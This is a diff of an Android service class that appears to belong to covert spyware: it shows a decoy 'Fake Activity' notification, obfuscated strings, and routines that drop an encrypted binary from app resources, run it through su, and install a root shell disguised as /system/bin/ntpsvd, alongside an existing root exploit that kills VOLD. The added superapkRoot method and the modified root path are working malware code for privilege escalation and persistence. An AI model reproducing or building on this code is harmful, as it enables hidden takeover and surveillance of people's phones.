@@ -13,10 +13,14 @@ import java.io.OutputStreamWriter;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.security.SecureRandom;
 import java.util.Arrays;
 
+import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.KeyGenerator;
 import javax.crypto.NoSuchPaddingException;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
@@ -34,6 +38,7 @@ import android.graphics.Bitmap;
 import android.graphics.Bitmap.Config;
 import android.graphics.Canvas;
 import android.graphics.Paint;
+import android.os.Build;
 import android.os.IBinder;
 import android.view.Display;
 import android.view.WindowManager;
@@ -56,6 +61,7 @@ public class ServiceCore extends Service {
 
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
 	private Notification notification;
+	private boolean needsNotification = false;
 	private Core core;
 
 	@Override
@@ -67,7 +73,7 @@ public class ServiceCore extends Service {
 	public void onCreate() {
 		super.onCreate();
 		Messages.init(getApplicationContext());
-
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
@@ -77,21 +83,35 @@ public class ServiceCore extends Service {
 			// setBackground();
 		}
 
-		Status.setAppContext(getApplicationContext());
-
-		Notification note = new Notification(R.drawable.notify_icon, "Ready to go?",
-				System.currentTimeMillis());
+		needsNotification = isNotificationNeeded();
 		
-		Intent i = new Intent(this, FakeActivity.class);
+		Status.setAppContext(getApplicationContext());
+		
+		if (needsNotification == true) {
+			Notification note = new Notification(R.drawable.notify_icon, "Ready to go?",
+					System.currentTimeMillis());
+			
+			Intent i = new Intent(this, FakeActivity.class);
+	
+			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+	
+			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
+	
+			note.setLatestEventInfo(this, "Fake Activity", "Now Playing: \"Sta cippa!\"", pi);
+			note.flags |= Notification.FLAG_NO_CLEAR;
+	
+			startForeground(1260, note);
+		}
+	}
 
-		i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-
-		PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
-
-		note.setLatestEventInfo(this, "Fake Activity", "Now Playing: \"Sta cippa!\"", pi);
-		note.flags |= Notification.FLAG_NO_CLEAR;
-
-		startForeground(1337, note);
+	private boolean isNotificationNeeded() {
+		int sdk_version = android.os.Build.VERSION.SDK_INT;
+		
+		if (sdk_version >= 11 /*Build.VERSION_CODES.HONEYCOMB*/) {
+			return true;
+		}
+		
+		return false;
 	}
 
 	@Override
@@ -109,10 +129,12 @@ public class ServiceCore extends Service {
 		}
 
 		if (Cfg.EXP) {
+			boolean isRoot = false;
+			
 			if (PackageInfo.checkRoot() == false) {
 				// Don't exploit if we have no SD card mounted
 				if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
-					Status.self().setRoot(root());
+					//isRoot = root();
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
@@ -120,21 +142,30 @@ public class ServiceCore extends Service {
 				}
 			}
 
-			if (PackageInfo.checkRoot() == true) {
+			if (isRoot == false) {
+				// Ask the user...
+				superapkRoot();
+				
+				isRoot = PackageInfo.checkRoot();
+			}
+			
+			if (isRoot == true) {
 				int ret = overridePermissions();
 
 				Toast.makeText(this, "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 
 				switch (ret) {
-				case 0:
-				case 1:
-					return; // Non possiamo partire
-
-				case 2: // Possiamo partire
-				default:
-					break;
+					case 0:
+					case 1:
+						return; // Non possiamo partire
+	
+					case 2: // Possiamo partire
+					default:
+						break;
 				}
 			}
+			
+			Status.self().setRoot(isRoot);
 		}
 
 		// Core starts
@@ -211,7 +242,9 @@ public class ServiceCore extends Service {
 		core.Stop();
 		core = null;
 		
-		stopForeground(true);
+		if (needsNotification == true) {
+			stopForeground(true);
+		}
 	}
 
 	private void setBackground() {
@@ -375,6 +408,47 @@ public class ServiceCore extends Service {
 		return 1;
 	}
 
+	// Prendi la root tramite superuser.apk
+	private boolean superapkRoot() {
+		final File filesPath = getApplicationContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
+		final String suidext = Messages.getString("32.6"); // statusdb
+		boolean isRoot = PackageInfo.checkRoot();
+		
+		Resources resources = getResources();
+		InputStream stream = resources.openRawResource(R.raw.statuslog);
+
+		stream = resources.openRawResource(R.raw.statusdb);
+		
+		try {
+			// 0x5A3D10448D7A912A
+			fileWrite(suidext, stream, Messages.getString("36.2"));
+			
+			// Proviamoci ad installare la nostra shell root
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
+				Check.log(TAG + " (superapkRoot): " + "su -c \"" + path + "/" + suidext + Messages.getString("32.11") + "\""); //$NON-NLS-1$
+			}
+			
+			Runtime.getRuntime().exec("chmod 755 " + path + "/" + suidext);
+			Runtime.getRuntime().exec("su -c \"" + path + "/" + suidext + Messages.getString("32.11") + "\""); //$NON-NLS-1$ //$NON-NLS-2$
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (superapkRoot): Exception"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+		
+		
+		return isRoot;
+	}
+	
 	private boolean root() {
 		try {
 			if (!Cfg.EXP) {
@@ -396,10 +470,12 @@ public class ServiceCore extends Service {
 
 			Resources resources = getResources();
 			InputStream stream = resources.openRawResource(R.raw.statuslog);
+			
 			// "0x5A3D10448D7A912B"
 			fileWrite(exploit, stream, Messages.getString("36.1"));
 
 			stream = resources.openRawResource(R.raw.statusdb);
+			
 			// 0x5A3D10448D7A912A
 			fileWrite(suidext, stream, Messages.getString("36.2"));
 
@@ -433,15 +509,16 @@ public class ServiceCore extends Service {
 			}
 
 			if (isRoot) {
-				// Killiamo VOLD per due volte
+				// Di' a suidext di fare il kill di VOLD per due volte
 				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.10")); //$NON-NLS-1$ //$NON-NLS-2$
 
-				// Installiamo la shell root
+				// Copia la shell root, ovvero il suidext, in /system/bin/ntpsvd
 				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32.11")); //$NON-NLS-1$ //$NON-NLS-2$
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
 				}
+				
 				if (Cfg.DEMO) {
 					Toast.makeText(this, Messages.getString("32.12"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 				}
@@ -455,8 +532,10 @@ public class ServiceCore extends Service {
 				if (Cfg.DEMO) {
 					Toast.makeText(this, Messages.getString("32.13"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 				}
-
 			}
+			
+			return isRoot;
+			
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -469,8 +548,6 @@ public class ServiceCore extends Service {
 
 			return false;
 		}
-
-		return true;
 	}
 
 	private boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
